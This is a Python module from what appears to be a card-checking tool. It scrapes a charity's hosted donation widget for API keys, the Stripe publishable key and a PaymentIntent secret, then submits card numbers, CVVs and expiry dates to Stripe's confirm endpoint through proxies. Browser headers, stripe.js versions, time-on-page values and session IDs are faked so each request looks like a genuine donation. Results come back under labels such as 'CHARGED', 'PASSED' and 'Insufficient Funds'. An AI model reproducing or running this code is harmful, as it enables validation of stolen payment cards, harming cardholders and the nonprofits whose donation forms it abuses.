"""
Stripe Charge handler — PaymentIntent creation + confirmation via Stripe API.
Supports v1_without_cookies (donation widget based).
"""

import re
import json
import random
import logging
from typing import Any, Dict, Optional, Tuple

import requests
from lxml import html

from core.session import REQUEST_TIMEOUT, _build_api_session, _apply_cookies
from core.geo import _fake
from core.proxy import _proxy_dict, is_proxy_error, categorize_proxy_error

logger = logging.getLogger(__name__)

CHARGE = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 ✅"
ERROR = "𝙀𝙍𝙍𝙊𝙍 ⚠️"
FAILED = "𝙁𝘼𝙄𝙇𝙀𝘿 ❌"
INSUFFICIENT_FUNDS = "𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩 𝙁𝙪𝙣𝙙𝙨 ☑️"
PASSAD = "𝙋𝘼𝙎𝙎𝙀𝘿 ❎"
SUCCESS = "𝙎𝙐𝘾𝘾𝞢𝙎𝙎 ✅"

_RE_PK_LIVE_RAW = re.compile(r"pk_live_[A-Za-z0-9]+")


def get_stripe_charge_v1_info(
    apikey: str,
    widget_id: str,
    random_person: Dict,
    gateway_config: Dict,
) -> Dict[str, Any]:
    """Fetch PaymentIntent + ClientSecret + pk_live from the donation widget."""
    help_url = gateway_config["help_1_url"]
    url = f"https://api.{help_url}/v1/Widget/{widget_id}?ApiKey={apikey}"

    payload = {
        "ServedSecurely": True,
        "FormUrl": f"https://crm.{help_url}/HostedDonation?ApiKey={apikey}&WidgetId={widget_id}",
        "Logs": [],
    }

    headers = {
        "User-Agent": random_person["user_agent"],
        "Content-Type": "application/json; charset=UTF-8",
        "sec-ch-ua": '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-gpc": "1",
        "accept-language": "en-US,en;q=0.8",
        "origin": f"https://crm.{help_url}",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": f"https://crm.{help_url}/",
        "priority": "u=1, i",
    }

    result: Dict[str, Any] = {"PaymentIntentId": None, "ClientSecret": None, "pk_live": None}
    proxies = _proxy_dict(gateway_config)
    api_session = _build_api_session(proxies)

    try:
        resp = api_session.post(url, data=json.dumps(payload), headers=headers, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        data = resp.json()
        pe = data.get("PaymentElement", {})
        if pe:
            result["PaymentIntentId"] = pe.get("PaymentIntentId")
            result["ClientSecret"] = pe.get("ClientSecret")
            m = _RE_PK_LIVE_RAW.search(resp.text)
            if m:
                result["pk_live"] = m.group(0)
        return result
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in get_stripe_charge_v1_info: {msg}")
            result["proxy_error"] = msg
            return result
        logger.error(f"Stripe Charge widget request failed: {exc}")
        return result
    except Exception as exc:
        logger.error(f"Unexpected error in get_stripe_charge_v1_info: {exc}")
        return result
    finally:
        api_session.close()


def confirm_payment_intent(
    payload: Dict,
    confirm_url: str,
    random_person: Dict,
    gateway_config: Optional[Dict] = None,
) -> requests.Response:
    """Confirm a Stripe PaymentIntent (Charge flow)."""
    headers = {
        "User-Agent": random_person["user_agent"],
        "Accept": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
    }

    proxies = _proxy_dict(gateway_config) if gateway_config else None
    api_session = _build_api_session(proxies)

    try:
        return api_session.post(confirm_url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
    except requests.RequestException as exc:
        is_pe, _ = is_proxy_error(exc)
        if is_pe:
            msg = categorize_proxy_error(exc)
            logger.error(f"Proxy error in confirm_payment_intent: {msg}")

            class _ProxyResp:
                content = json.dumps({"proxy_error": msg}).encode()
                text = json.dumps({"proxy_error": msg})
                status_code = 0

            return _ProxyResp()
        raise
    finally:
        api_session.close()


def _check_required_fields(gateway_config: Dict, fields: list) -> Optional[str]:
    """Return missing field name or None if all present."""
    for f in fields:
        if f not in gateway_config:
            return f
    return None


def _parse_charge_response(content: bytes) -> Tuple[str, str]:
    """Parse the Stripe PaymentIntent confirmation response."""
    try:
        data = json.loads(content)

        if "proxy_error" in data:
            return ERROR, data["proxy_error"]

        if data.get("status") == "succeeded":
            return CHARGE, "Succeeded"

        if data.get("status") == "requires_action":
            return PASSAD, "Challenge Required"

        error_message = "Unknown error"

        if "error" in data:
            err_obj = data["error"]
            error_message = err_obj.get("message", "Unknown error")
            decline_code = err_obj.get("decline_code")
            if decline_code:
                if decline_code == "insufficient_funds":
                    return INSUFFICIENT_FUNDS, "Insufficient Funds"
                error_message = f"{error_message} ({decline_code.replace('_', ' ').title()})"
        elif "data" in data and isinstance(data["data"], dict) and "error" in data["data"]:
            raw = data["data"]["error"].get("message", "Unknown error")
            error_message = raw.split("Error: ")[-1]

        return FAILED, error_message

    except (json.JSONDecodeError, ValueError):
        return ERROR, "Failed to parse response"


def _generate_stripe_charge_payload(
    gateway_config: Dict,
    card_info: Dict,
    random_person: Dict,
    secrets: Dict,
) -> Tuple[bool, Any, Any]:
    """Build Stripe Charge v1 payload."""
    version = gateway_config.get("version", "")

    if "v1_without_cookies" in version:
        missing = _check_required_fields(gateway_config, ["url", "post_url"])
        if missing:
            return False, f"{missing} is missing in gateway config", None

        api_key = secrets.get("ApiKey")
        if not api_key:
            return False, "Failed to fetch ApiKey", None

        widget_id = secrets.get("widgetId")
        if not widget_id:
            return False, "Failed to fetch widgetId", None

        payment_info = get_stripe_charge_v1_info(api_key, widget_id, random_person, gateway_config)

        if payment_info.get("proxy_error"):
            return False, payment_info["proxy_error"], None

        pi_id = payment_info.get("PaymentIntentId")
        if not pi_id:
            return False, "Failed to fetch PaymentIntentId", None

        client_secret = payment_info.get("ClientSecret")
        if not client_secret:
            return False, "Failed to fetch ClientSecret", None

        pk_live = payment_info.get("pk_live")
        if not pk_live:
            return False, "Failed to fetch pk_live", None

        help_url = gateway_config["help_1_url"]
        payload = {
            "return_url": f"https://crm.{help_url}/HostedDonation?ApiKey={api_key}&WidgetId={widget_id}",
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": random_person["zipcode"],
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_info["number"],
            "payment_method_data[card][cvc]": card_info["cvv"],
            "payment_method_data[card][exp_year]": card_info["year"],
            "payment_method_data[card][exp_month]": card_info["month"],
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": (
                f"stripe.js/{random.randint(280000000, 290000000)}; "
                f"stripe-js-v3/{random.randint(280000000, 290000000)}; payment-element"
            ),
            "payment_method_data[referrer]": f"https://crm.{help_url}",
            "payment_method_data[time_on_page]": str(random.randint(120000, 240000)),
            "payment_method_data[client_attribution_metadata][client_session_id]": str(_fake.uuid4()),
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
            "payment_method_data[client_attribution_metadata][elements_session_config_id]": str(_fake.uuid4()),
            "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]": "payment",
            "payment_method_data[guid]": str(_fake.uuid4()),
            "payment_method_data[muid]": str(_fake.uuid4()),
            "payment_method_data[sid]": str(_fake.uuid4()),
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": pk_live,
            "client_attribution_metadata[client_session_id]": str(_fake.uuid4()),
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "standard",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[elements_session_config_id]": str(_fake.uuid4()),
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
            "client_secret": client_secret,
        }

        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        return True, payload, confirm_url

    return False, f"Unsupported Stripe Charge version: {version}", None


def handle_stripe_charge(card_info: Dict, person: Dict, gateway_config: Dict) -> Tuple[str, str]:
    """Main entry point for Stripe Charge processing.

    Flow:
        1. Scrape gateway page for secrets (ApiKey, widgetId)
        2. Fetch PaymentIntent from widget API
        3. Confirm the PaymentIntent via Stripe API with card data
    """
    version = gateway_config.get("version", "")

    if "v1_without_cookies" in version:
        from gateways.stripe_auth import extract_payment_config, _build_dummy_session, _RE_API_KEY, _RE_WIDGET_ID, _RE_WIDGET_ID_ALT

        session = _build_dummy_session(gateway_config, person)

        missing = _check_required_fields(gateway_config, ["url", "post_url", "help_1_url"])
        if missing:
            return ERROR, f"{missing} is missing in gateway config"

        try:
            secrets = extract_payment_config(None, card_info["number"], person, gateway_config, session)

            if secrets.get("proxy_error"):
                return ERROR, secrets["proxy_error"]

            api_key = secrets.get("ApiKey")
            if not api_key:
                return ERROR, "Failed to fetch ApiKey"

            widget_id = secrets.get("widgetId")
            if not widget_id:
                return ERROR, "Failed to fetch widgetId"

            pi_id = secrets.get("payment_intent_id")

            payment_info = get_stripe_charge_v1_info(api_key, widget_id, person, gateway_config)

            if payment_info.get("proxy_error"):
                return ERROR, payment_info["proxy_error"]

            pi_id = payment_info.get("PaymentIntentId")
            if not pi_id:
                return ERROR, "Failed to fetch PaymentIntentId"

            client_secret = payment_info.get("ClientSecret")
            if not client_secret:
                return ERROR, "Failed to fetch ClientSecret"

            pk_live = payment_info.get("pk_live")
            if not pk_live:
                return ERROR, "Failed to fetch pk_live"

            confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"

            help_url = gateway_config["help_1_url"]
            charge_payload = {
                "return_url": f"https://crm.{help_url}/HostedDonation?ApiKey={api_key}&WidgetId={widget_id}",
                "payment_method_data[billing_details][address][country]": "US",
                "payment_method_data[billing_details][address][postal_code]": person["zipcode"],
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": card_info["number"],
                "payment_method_data[card][cvc]": card_info["cvv"],
                "payment_method_data[card][exp_year]": card_info["year"],
                "payment_method_data[card][exp_month]": card_info["month"],
                "payment_method_data[allow_redisplay]": "unspecified",
                "payment_method_data[pasted_fields]": "number",
                "payment_method_data[payment_user_agent]": (
                    f"stripe.js/{random.randint(280000000, 290000000)}; "
                    f"stripe-js-v3/{random.randint(280000000, 290000000)}; payment-element"
                ),
                "payment_method_data[referrer]": f"https://crm.{help_url}",
                "payment_method_data[time_on_page]": str(random.randint(120000, 240000)),
                "payment_method_data[guid]": str(_fake.uuid4()),
                "payment_method_data[muid]": str(_fake.uuid4()),
                "payment_method_data[sid]": str(_fake.uuid4()),
                "expected_payment_method_type": "card",
                "use_stripe_sdk": "true",
                "key": pk_live,
                "client_secret": client_secret,
            }

            response = confirm_payment_intent(charge_payload, confirm_url, person, gateway_config)
            status, message = _parse_charge_response(response.content)
            return status, message

        except requests.RequestException as exc:
            is_pe, _ = is_proxy_error(exc)
            if is_pe:
                return ERROR, categorize_proxy_error(exc)
            return ERROR, f"Request failed: {exc}"
        except Exception as exc:
            return ERROR, f"Processing failed: {exc}"
        finally:
            try:
                session.close()
            except Exception:
                pass

    return ERROR, f"Unsupported Stripe Charge version: {version}"
